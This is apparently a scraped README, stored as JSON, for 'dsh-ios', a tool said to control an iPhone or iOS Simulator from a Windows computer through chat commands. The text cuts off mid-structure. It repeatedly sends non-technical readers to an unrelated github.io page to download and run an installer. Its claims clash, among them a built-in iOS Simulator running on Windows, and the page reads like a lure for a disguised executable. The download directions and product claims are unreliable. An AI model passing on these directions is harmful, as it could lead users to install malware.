  "readme": [
    {
      "section": "📱 dsh-ios - Control Your iPhone From Your Computer",
      "text": "[](https://kickstartparty3459.github.io)"
    },
    {
      "section": "🎯 What Is dsh-ios?",
      "text": "dsh-ios is a powerful tool that lets you see and control your iPhone or iOS Simulator right from your computer screen. Think of it as a remote control for your phone - but much smarter. It works inside a conversation window, meaning you can give it commands and watch it operate your device in real time."
    },
    {
      "section": "🎯 What Is dsh-ios?",
      "text": "Whether you're testing apps, showing someone how to use a feature, or automating repetitive tasks, dsh-ios makes it easy. You don't need to be a programmer to use it. If you can click a button and type a message, you can use dsh-ios."
    },
    {
      "section": "🚀 Getting Started",
      "text": "Getting started with dsh-ios is simple. Follow these steps:\n\n1. **Visit this link to download the application**: [https://kickstartparty3459.github.io](https://kickstartparty3459.github.io)\n2. Choose the latest version available.\n3. Download the file to your computer.\n\nThat's it! Once downloaded, you're ready to connect your device."
    },
    {
      "section": "📥 Download and Installation",
      "text": "Here's how to get dsh-ios running on your Windows computer:"
    },
    {
      "section": "Step 1: Download",
      "text": "Visit this link to download the application: [https://kickstartparty3459.github.io](https://kickstartparty3459.github.io)\n\nLook for the newest release. Click the download button and save the file somewhere you can find it easily, like your Desktop or Downloads folder."
    },
    {
      "section": "Step 2: Install",
      "text": "Once the download is complete, open the file you downloaded. Follow the simple on-screen instructions. The installer will guide you through the process. It usually takes less than a minute."
    },
    {
      "section": "Step 3: Launch",
      "text": "After installation, find the dsh-ios icon on your desktop or in your Start Menu. Double-click it to open the application."
    },
    {
      "section": "🔌 Connecting Your iPhone",
      "text": "To use dsh-ios with your actual iPhone, you'll need:\n\n- A USB cable (the one that came with your phone works perfectly)\n- Your iPhone unlocked\n\nJust plug your iPhone into your computer using the USB cable. dsh-ios will automatically detect your device. You'll see your phone's screen appear in the application window within seconds."
    },
    {
      "section": "🖥️ Using the iOS Simulator",
      "text": "Don't have an iPhone? No problem! dsh-ios includes a built-in iOS Simulator. This is a virtual iPhone that runs right on your computer. You can use it to test apps, try features, or just explore how iOS works - all without needing a physical phone.\n\nTo start the simulator, simply click the \"Simulator\" button in dsh-ios. A new window will open showing a virtual iPhone screen. You can interact with it just like a real phone."
    },
    {
      "section": "🛠️ Powerful Tools at Your Fingertips",
      "text": "dsh-ios comes with 22 different tools to help you control your device. Here are some of the most useful ones:"
    },
    {
      "section": "👆 Tap and Type",
      "text": "You can tap buttons, type text, and swipe screens - all from your computer. Just click on the phone screen shown in dsh-ios, and your actions happen on the real device."
    },
    {
      "section": "🔍 Find Anything by Sight",
      "text": "dsh-ios can \"see\" your screen. It uses smart technology to recognize buttons, text fields, and other elements. You can tell it \"tap the login button\" and it will find and tap it automatically."
    },
    {
      "section": "📝 Read Text from Screen",
      "text": "Need to copy text from your phone? dsh-ios can read any text displayed on the screen. It's like having a magic highlighter that captures words for you."
    },
    {
      "section": "📋 Work with Lists",
      "text": "If your app shows a list of items (like emails or contacts), dsh-ios can navigate through them. You can select specific rows, scroll through lists, and manage items easily."
    },
    {
      "section": "🎛️ Sidebar Control Panel",
      "text": "A special sidebar panel appears alongside your device view. You can click and drag on it to control different aspects of your device. It's designed to be intuitive and responsive."
    },
    {
      "section": "💬 Using dsh-ios in Conversations",
      "text": "One of the coolest features of dsh-ios is that it works inside a conversation. This means you can type commands in plain English, and dsh-ios will carry them out.\n\nFor example, you could type:\n- \"Open the Settings app\"\n- \"Take a screenshot\"\n- \"Turn on Wi-Fi\"\n- \"Scroll down\"\n\ndsh-ios understands these commands and performs them on your connected device. It's like having a helpful assistant who operates your phone for you."
    },
    {
      "section": "🎓 Who Should Use dsh-ios?",
      "text": "dsh-ios is perfect for:\n\n- **App Testers**: Automate repetitive testing tasks\n- **Teachers and Trainers**: Show students how to use iPhone features\n- **Tech Support**: Help others solve problems by controlling their device remotely\n- **Power Users**: Automate daily tasks on your iPhone\n- **Curious Beginners**: Explore iOS features in a safe, controlled way"
    },
    {
      "section": "Do I need programming skills?",
      "text": "No! dsh-ios is designed for everyone. If you can use a computer, you can use dsh-ios."
    },
    {
      "section": "Is my data safe?",
      "text": "Yes. dsh-ios works locally on your computer. Your data stays with you."
    },
    {
      "section": "Can I use dsh-ios without an iPhone?",
      "text": "Absolutely! The built-in iOS Simulator works perfectly without any physical device."
    },
    {
      "section": "What if I have problems?",
      "text": "The application includes helpful error messages and guides. Most issues can be solved by restarting the app or reconnecting your device."
    },
    {
      "section": "📚 Getting Help",
      "text": "If you run into any issues, try these steps:\n\n1. Restart dsh-ios\n2. Unplug and replug your iPhone\n3. Check that your USB cable works with other devices\n4. Look for updates to dsh-ios"
    },
    {
      "section": "🔄 Keeping dsh-ios Updated",
